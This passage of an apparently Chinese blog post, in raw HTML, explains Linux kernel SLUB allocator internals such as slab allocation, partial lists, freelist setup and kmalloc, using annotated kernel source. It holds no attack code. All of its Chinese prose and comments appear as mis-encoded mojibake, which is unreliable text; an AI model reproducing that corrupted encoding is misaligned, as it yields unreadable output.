class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">new_slab:<br><br><span class="hljs-keyword">if</span> (slub_percpu_partial(c)) &#123;<span class="hljs-comment">//æœ‰ percpu partial slab</span><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(c-&gt;slab)) &#123;<span class="hljs-comment">//percpu slab ä¸ä¸ºç©ºï¼Œç›´æ¥è·³å› redo</span><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br><span class="hljs-keyword">if</span> (unlikely(!slub_percpu_partial(c))) &#123;<span class="hljs-comment">//è¢«æŠ¢å ç„¶åpartialç©ºäº†</span><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-comment">/* æˆ‘ä»¬è¢«æŠ¢å äº†ä¸” partial é“¾è¡¨ç©ºäº† */</span><br><span class="hljs-keyword">goto</span> new_objects;<br>&#125;<br><br><span class="hljs-comment">// è·å–ä¸€å¼  percpu patial slabï¼Œè·³å› redo</span><br>slab = c-&gt;slab = slub_percpu_partial(c);<br>slub_set_percpu_partial(c, slab);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>stat(s, CPU_PARTIAL_ALLOC);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="â‘¤-new-objectsï¼šè·å–-node-pertial-slab-æˆ–å‘-buddy-è¯·æ±‚æ–°-slab-è¿›è¡Œåˆ†é…">â‘¤ new_objectsï¼šè·å– node pertial slab æˆ–å‘ buddy è¯·æ±‚æ–° slab è¿›è¡Œåˆ†é…</h4><p>è‹¥ percpu partial é“¾è¡¨ä¹Ÿä¸ºç©ºï¼Œé‚£ä¹ˆä¾¿æ¥åˆ°æ¥ä¸‹æ¥çš„ <code>new_objects</code> æ ‡ç­¾åˆ†é…ä¸€ä¸ªæ–°çš„ slabï¼Œé¦–å…ˆä¼šè®¾ç½® <code>partial_context</code>ï¼Œè°ƒç”¨ <code>get_partial()</code> å°è¯•ä» <code>kmem_cache_node</code> çš„ partial é“¾è¡¨åˆ†é…ä¸€ä¸ª slabï¼Œè‹¥åˆ†é…æˆåŠŸåˆ™ç›´æ¥è·³è½¬åˆ° <code>check_new_slab</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">new_objects:<br><br>pc.flags = gfpflags;<br>pc.slab = &amp;slab;<br>pc.orig_size = orig_size;<br>freelist = get_partial(s, node, &amp;pc);<br><span class="hljs-keyword">if</span> (freelist)<br><span class="hljs-keyword">goto</span> check_new_slab;<br><br></code></pre></td></tr></table></figure><p><code>get_partial()</code> é¦–å…ˆä¼šè°ƒç”¨ <code>get_partial_node()</code> ä»å½“å‰ node çš„ <code>kmem_cache_node</code> çš„ partial é“¾è¡¨åˆ†é… slabï¼Œè‹¥æˆåŠŸäº†åˆ™ç›´æ¥è¿”å›ï¼Œå¦‚æœå¤±è´¥äº†ä½†æ˜¯æŒ‡å®šäº†åˆ†é…çš„ node ä¸º <code>NUMA_NO_NODE</code>ï¼Œåˆ™è°ƒç”¨ <code>get_any_partial()</code> ä»å…¶ä»–çš„ <code>kmem_cache_node</code> çš„ partial é“¾è¡¨å°è¯•åˆ†é…ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è·å–ä¸€ä¸ª partial slab, åŠ é”å¹¶è¿”å›.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">get_partial</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">int</span> node, <span class="hljs-keyword">struct</span> partial_context *pc)</span><br>&#123;<br><span class="hljs-type">void</span> *object;<br><span class="hljs-type">int</span> searchnode = node;<br><br><span class="hljs-keyword">if</span> (node == NUMA_NO_NODE)<br>searchnode = numa_mem_id();<br><br><span class="hljs-comment">// ä»å½“å‰ node çš„ partial é“¾è¡¨åˆ†é… slab</span><br>object = get_partial_node(s, get_node(s, searchnode), pc);<br><span class="hljs-keyword">if</span> (object || node != NUMA_NO_NODE)<br><span class="hljs-keyword">return</span> object;<br><br><span class="hljs-comment">// ä»å…¶ä»– node çš„ partial é“¾è¡¨åˆ†é… slab</span><br><span class="hljs-keyword">return</span> get_any_partial(s, pc);<br>&#125;<br></code></pre></td></tr></table></figure><p>è‹¥ <code>get_partial()</code> æ²¡æ³•è·å–åˆ° slabï¼Œåˆ™è°ƒç”¨ <code>new_slab()</code> å‘ buddy system è¯·æ±‚ä¸€ä»½æ–°çš„ slabï¼Œè‹¥å¤±è´¥äº†åˆ™ç›´æ¥è¿”å›ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">slub_put_cpu_ptr(s-&gt;cpu_slab);<br>slab = new_slab(s, gfpflags, node);<br>c = slub_get_cpu_ptr(s-&gt;cpu_slab);<br><br><span class="hljs-keyword">if</span> (unlikely(!slab)) &#123;<br>slab_out_of_memory(s, gfpflags, node);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>stat(s, ALLOC_SLAB);<br></code></pre></td></tr></table></figure><p><code>new_slab()</code> æœ€åä¼šè°ƒç”¨åˆ° <code>allocate_slab()</code>ï¼š</p><ul><li>é¦–å…ˆæ£€æŸ¥é¡µé¢åˆ†é…æ ‡å¿—ä½ï¼Œä¹‹åè°ƒç”¨ <code>alloc_slab_page()</code> åœ¨æŒ‡å®š node ä¸Šè¿›è¡Œåˆ†é…<ul><li>è‹¥ <code>node == NUMA_NO_NODE</code>ï¼Œåˆ™è¯¥å‡½æ•°ä¼šè°ƒç”¨ <code>alloc_pages()</code>ï¼Œå¦åˆ™ä¼šè°ƒç”¨ <code>__alloc_pages_node()</code></li></ul></li><li>è‹¥å¤±è´¥äº†åˆ™å†æ¬¡è°ƒç”¨  <code>alloc_slab_page()</code>  å°è¯•è¿›è¡Œæœ€å°å†…å­˜åˆ†é…ï¼ˆ<code>kmem_cache-&gt;min</code>ï¼‰ï¼Œä»å¤±è´¥åˆ™ç›´æ¥è¿”å› NULL</li><li>åˆå§‹åŒ– slab å„æˆå‘˜ï¼Œå¹¶è°ƒç”¨ <code>shuffle_freelist()</code> ä¸ºç©ºé—²å¯¹è±¡æ„é€ éšæœºåŒ–é“¾è¡¨ï¼Œè‹¥æœªå¼€å¯éšæœºåŒ–åˆ™å°†ç©ºé—²å¯¹è±¡æŒ‰é¡ºåºè¿æ¥</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> slab *<span class="hljs-title function_">allocate_slab</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">oo</span> =</span> s-&gt;oo;<br><span class="hljs-type">gfp_t</span> alloc_gfp;<br><span class="hljs-type">void</span> *start, *p, *next;<br><span class="hljs-type">int</span> idx;<br><span class="hljs-type">bool</span> shuffle;<br><br>flags &amp;= gfp_allowed_mask;<br><br>flags |= s-&gt;allocflags;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è®©æœ€åˆçš„ higher-order åˆ†é…åœ¨å†…å­˜å‹åŠ›ä¸‹å¤±è´¥</span><br><span class="hljs-comment"> * ç”±æ­¤æˆ‘ä»¬è¿”å›åˆ°æœ€å° order çš„åˆ†é….</span><br><span class="hljs-comment"> */</span><br>alloc_gfp = (flags | __GFP_NOWARN | __GFP_NORETRY) &amp; ~__GFP_NOFAIL;<br><span class="hljs-keyword">if</span> ((alloc_gfp &amp; __GFP_DIRECT_RECLAIM) &amp;&amp; oo_order(oo) &gt; oo_order(s-&gt;min))<br>alloc_gfp = (alloc_gfp | __GFP_NOMEMALLOC) &amp; ~__GFP_RECLAIM;<br><br>slab = alloc_slab_page(alloc_gfp, node, oo);<br><span class="hljs-keyword">if</span> (unlikely(!slab)) &#123;<span class="hljs-comment">//åˆ†é…å¤±è´¥ï¼Œå°è¯•æœ€å°å†…å­˜åˆ†é…</span><br>oo = s-&gt;min;<br>alloc_gfp = flags;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * åˆ†é…å¯èƒ½å› ä¸ºç¢ç‰‡åŒ–è€Œå¤±è´¥.</span><br><span class="hljs-comment"> * å¯èƒ½çš„è¯å°è¯•ä¸€ä¸ª lower order çš„åˆ†é…</span><br><span class="hljs-comment"> */</span><br>slab = alloc_slab_page(alloc_gfp, node, oo);<br><span class="hljs-keyword">if</span> (unlikely(!slab))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>stat(s, ORDER_FALLBACK);<br>&#125;<br><br>slab-&gt;objects = oo_objects(oo);<br>slab-&gt;inuse = <span class="hljs-number">0</span>;<br>slab-&gt;frozen = <span class="hljs-number">0</span>;<br><br>account_slab(slab, oo_order(oo), s, flags);<br><br>slab-&gt;slab_cache = s;<br><br>kasan_poison_slab(slab);<br><br>start = slab_address(slab);<br><br>setup_slab_debug(s, slab, start);<br><br><span class="hljs-comment">//å¼€å¯äº†éšæœºåŒ–ä¼šåœ¨è¯¥å‡½æ•°å†…éšæœºè¿æ¥</span><br>shuffle = shuffle_freelist(s, slab);<br><br><span class="hljs-comment">//æœªå¼€å¯éšæœºåŒ–ï¼ŒæŒ‰é¡ºåºè¿æ¥</span><br><span class="hljs-keyword">if</span> (!shuffle) &#123;<br>start = fixup_red_left(s, start);<br>start = setup_object(s, start);<br>slab-&gt;freelist = start;<br><span class="hljs-keyword">for</span> (idx = <span class="hljs-number">0</span>, p = start; idx &lt; slab-&gt;objects - <span class="hljs-number">1</span>; idx++) &#123;<br>next = p + s-&gt;size;<br>next = setup_object(s, next);<br>set_freepointer(s, p, next);<br>p = next;<br>&#125;<br>set_freepointer(s, p, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> slab;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨äº†ä¸€ä¸ªå‡½æ•° <code>set_freepointer()</code>ï¼Œä¸»è¦å°±æ˜¯ç”¨ <code>freelist_ptr()</code> å‘ <code>object + s-&gt;offset</code> çš„ä½ç½®å†™å…¥ç”¨ <code>freelist_ptr()</code> åŠ å¯†åçš„ <code>fp</code> æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">set_freepointer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *object, <span class="hljs-type">void</span> *fp)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> freeptr_addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)object + s-&gt;offset;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br>BUG_ON(object == fp); <span class="hljs-comment">/* naive detection of double free or corruption */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>freeptr_addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)kasan_reset_tag((<span class="hljs-type">void</span> *)freeptr_addr);<br>*(<span class="hljs-type">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿”å› <code>___slab_alloc()</code>ï¼Œå¦‚æœ<strong>è¯¥ kmem_cache è®¾ç½®äº† <code>SLAB_DEBUG_FLAGS</code> æ ‡å¿—ä½</strong>ï¼Œåˆ™æ¥ä¸‹æ¥ä¼šè°ƒç”¨ <code>alloc_single_from_new_slab()</code> <strong>ä»æ–°è·å–åˆ°çš„ slab ä¸Šåˆ†é…ä¸€ä¸ªå¯¹è±¡åå°† slab é‡æ–°æŒ‚å› partial/full é“¾è¡¨</strong>ï¼Œè‹¥åˆ†é…å¤±è´¥åˆ™è·³è½¬å› <code>new_objects</code>ï¼ŒæˆåŠŸåˆ™ç›´æ¥è¿”å›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (kmem_cache_debug(s)) &#123;<br>freelist = alloc_single_from_new_slab(s, slab, orig_size);<br><br><span class="hljs-keyword">if</span> (unlikely(!freelist))<br><span class="hljs-keyword">goto</span> new_objects;<br><br><span class="hljs-keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)<br>set_track(s, freelist, TRACK_ALLOC, addr);<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰è®¾ç½® <code>SLAB_DEBUG_FLAGS</code> æ ‡å¿—ä½ï¼Œåˆ™æ¥ä¸‹æ¥è·å– slab çš„ freelistï¼Œå¹¶è°ƒç”¨ <code>inc_slabs_node()</code> å¢åŠ  node ä¸Šçš„è®¡æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * No other reference to the slab yet so we can</span><br><span class="hljs-comment"> * muck around with it freely without cmpxchg</span><br><span class="hljs-comment"> */</span><br>freelist = slab-&gt;freelist;<br>slab-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>slab-&gt;inuse = slab-&gt;objects;<br>slab-&gt;frozen = <span class="hljs-number">1</span>;<br><br>inc_slabs_node(s, slab_nid(slab), slab-&gt;objects);<br></code></pre></td></tr></table></figure><h4 id="â‘¥-check-new-slabï¼šæ£€æŸ¥-slab">â‘¥ check_new_slabï¼šæ£€æŸ¥ slab</h4><p>æ¥ä¸‹æ¥å¯¹æ–°è·å–çš„ slab è¿›è¡Œæ£€æŸ¥ï¼Œè‹¥è¯¥ kmem_cache è®¾ç½®äº† <code>SLAB_DEBUG_FLAGS</code> æ ‡å¿—ä½ï¼Œæ£€æŸ¥æ˜¯å¦è®¾ç½®äº† <code>SLAB_STORE_USER</code> æ ‡å¿—ä½ï¼Œä¹‹åç›´æ¥è¿”å› freelist</p><p>æ¥ä¸‹æ¥è°ƒç”¨ <code>pfmemalloc_match()</code> æ£€æŸ¥ slab ä¸åˆ†é…æ ‡å¿—ä½æ˜¯å¦ä¸åŒ¹é…ï¼Œè‹¥æ˜¯åˆ™è°ƒç”¨ <code>deactivate_slab()</code> ä½¿å…¶ä¸å†æ´»åŠ¨å¹¶è¿”å› freelist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">check_new_slab:<br><br><span class="hljs-keyword">if</span> (kmem_cache_debug(s)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * For debug caches here we had to go through</span><br><span class="hljs-comment"> * alloc_single_from_partial() so just store the tracking info</span><br><span class="hljs-comment"> * and return the object</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)<br>set_track(s, freelist, TRACK_ALLOC, addr);<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br><span class="hljs-keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags))) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * For !pfmemalloc_match() case we don&#x27;t load freelist so that</span><br><span class="hljs-comment"> * we don&#x27;t make further mismatched allocations easier.</span><br><span class="hljs-comment"> */</span><br>deactivate_slab(s, slab, get_freepointer(s, freelist));<br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="â‘¦-retry-load-slabï¼š">â‘¦ retry_load_slabï¼š</h4><p>æœ€åå°±æ˜¯å°è¯•åŠ è½½æ–°è·å¾—çš„ slabï¼Œå¦‚æœ percpu slab ä¸ä¸º NULL åˆ™ä½¿å…¶ä¸å†æ´»åŠ¨ï¼Œå¹¶è®¾ç½® percpu slab &amp; freelist ä¸º NULLï¼Œå¹¶è·å–ä¸‹ä¸€ä¸ª tid</p><p>æœ€åå°±æ˜¯å°† percpu slab è®¾ä¸ºæ–°è·å–çš„ slab å¹¶è·³è½¬å› <code>load_freelist</code> åˆ†é…å¯¹è±¡å¹¶è¿”å›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">retry_load_slab:<br><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(c-&gt;slab)) &#123;<br><span class="hljs-type">void</span> *flush_freelist = c-&gt;freelist;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">flush_slab</span> =</span> c-&gt;slab;<br><br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><br>deactivate_slab(s, flush_slab, flush_freelist);<br><br>stat(s, CPUSLAB_FLUSH);<br><br><span class="hljs-keyword">goto</span> retry_load_slab;<br>&#125;<br>c-&gt;slab = slab;<br><br><span class="hljs-keyword">goto</span> load_freelist;<br>&#125;<br></code></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œ slub åˆ†é…ç®—æ³•çš„æ ¸å¿ƒé€»è¾‘åˆ†æç»“æŸ</p><h2 id="äºŒã€kmallocï¼š-NUMA-NO-NODE-çš„é€šç”¨ä¸Šå±‚åˆ†é…æ¥å£">äºŒã€kmallocï¼š NUMA_NO_NODE çš„é€šç”¨ä¸Šå±‚åˆ†é…æ¥å£</h2><p>æˆ‘ä»¬æ—¥å¸¸ç”Ÿæ´»ä¸­ï¼ˆï¼Ÿï¼‰æœ€å¸¸ç”¨çš„å…¶å®è¿˜æ˜¯ <code>kmalloc()</code>ï¼Œå…¶ä¼šæ ¹æ®åˆ†é…çš„å¤§å°ä¸æ ‡å¿—ä½å¸®æˆ‘ä»¬å®Œæˆ <code>kmem_cache</code> çš„é€‰å–å¹¶è¿›è¡Œå¯¹è±¡åˆ†é…</p><p>å‡½æ•°æ•´ä½“é€»è¾‘æ¯”è¾ƒç®€å•ï¼š</p><ul><li>è‹¥åˆ†é…çš„å¤§å°åœ¨ç¼–è¯‘æœŸå·²çŸ¥ï¼ˆ<code>__builtin_constant_p()</code>ï¼‰åˆ™åˆ¤æ–­å¤§å°ï¼š<ul><li>è‹¥å¤§å°å¤§äº <code>KMALLOC_MAX_CACHE_SIZE</code> åˆ™ä½¿ç”¨ <code>kmalloc_large()</code> è¿›è¡Œåˆ†é…</li><li>é€šè¿‡ <code>kmalloc_index()</code> ä¸ <code>kmalloc_type()</code> è·å– <code>kmalloc_caches</code> ä¸­å¯¹åº”çš„æ•°ç»„ä¸‹æ ‡å¹¶è°ƒç”¨ <code>kmalloc_trace</code> è¿›è¡Œå¯¹è±¡åˆ†é…</li></ul></li><li>è‹¥å¤§å°æ˜¯åŠ¨æ€ä¼ å…¥çš„ï¼Œè°ƒç”¨ <code>__kmalloc()</code> è¿›è¡Œåˆ†é…</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * kmalloc - åˆ†é…å†…æ ¸å†…å­˜</span><br><span class="hljs-comment"> * @size: éœ€è¦çš„å†…å­˜å­—èŠ‚æ•°.</span><br><span class="hljs-comment"> * @flags: æè¿°åˆ†é…ä¸Šä¸‹æ–‡</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * kmalloc æ˜¯å†…æ ¸ä¸­åˆ†é…å°äºé¡µé¢å¤§å°çš„å†…å­˜å¯¹è±¡çš„é€šç”¨æ–¹æ³•.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è¢«åˆ†é…çš„å¯¹è±¡åœ°å€è‡³å°‘è¦å¯¹é½åˆ° ARCH_KMALLOC_MINALIGN å­—èŠ‚.</span><br><span class="hljs-comment"> * å¯¹äº 2^n å­—èŠ‚çš„ @size , å¯¹é½ä¹Ÿéœ€è¦ä¿è¯è‡³å°‘åˆ°è¯¥å¤§å°.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @flags argument å¯èƒ½æ˜¯ include/linux/gfp.h ä¸­å®šä¹‰çš„GFP æ ‡å¿—ä½ï¼Œæè¿°äº</span><br><span class="hljs-comment"> * :ref:`Documentation/core-api/mm-api.rst &lt;mm-api-gfp-flags&gt;`</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ¨èçš„å¯¹ @flags ä½¿ç”¨æè¿°äº</span><br><span class="hljs-comment"> * :ref:`Documentation/core-api/memory-allocation.rst &lt;memory_allocation&gt;`</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ä»¥ä¸‹ä¸ºæœ€å¸¸ç”¨çš„ GFP æ ‡å¿—ä½ç®€è¦æ¦‚è¿°</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_KERNEL</span><br><span class="hljs-comment"> *åˆ†é…æ™®é€šå†…æ ¸å†…å­˜. å¯èƒ½ç¡çœ .</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_NOWAIT</span><br><span class="hljs-comment"> *åˆ†é…å°†ä¸ä¼šç¡çœ .</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_ATOMIC</span><br><span class="hljs-comment"> *åˆ†é…å°†ä¸ä¼šç¡çœ .  å¯èƒ½ä½¿ç”¨ emergency pools.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ä¹Ÿå¯ä»¥é€šè¿‡å¼‚æˆ–ä»¥ä¸‹çš„ä¸€ä¸ªæˆ–å¤šä¸ªé¢å¤–@flagsæ¥è®¾ç½®ä¸åŒçš„æ ‡å¿—ä½:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_ZERO</span><br><span class="hljs-comment"> *åœ¨è¿”å›å‰æ¸…é›¶åˆ†é…çš„å†…å­˜. ä¹Ÿå¯å‚è§ kzalloc().</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_HIGH</span><br><span class="hljs-comment"> *è¿™ä¸ªåˆ†é…æœ‰ç€é«˜ä¼˜å…ˆçº§ä¸”å¯èƒ½ä½¿ç”¨ emergency pools.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NOFAIL</span><br><span class="hljs-comment"> *è¡¨ç¤ºæ­¤æ¬¡åˆ†é…ä¸å…è®¸å¤±è´¥</span><br><span class="hljs-comment"> *(åœ¨ä½¿ç”¨å‰å†æ¬¡æ€è€ƒ).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NORETRY</span><br><span class="hljs-comment"> *è‹¥å†…å­˜ä¸ä¼šé©¬ä¸Šå¯ç”¨,ç«‹å³æ”¾å¼ƒ.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NOWARN</span><br><span class="hljs-comment"> *è‹¥åˆ†é…å¤±è´¥ï¼Œä¸è¦æäº¤è­¦å‘Š.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_RETRY_MAYFAIL</span><br><span class="hljs-comment"> *åŠªåŠ›å°è¯•ä½¿åˆ†é…æˆåŠŸï¼Œä½†æœ€ç»ˆå¤±è´¥.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span 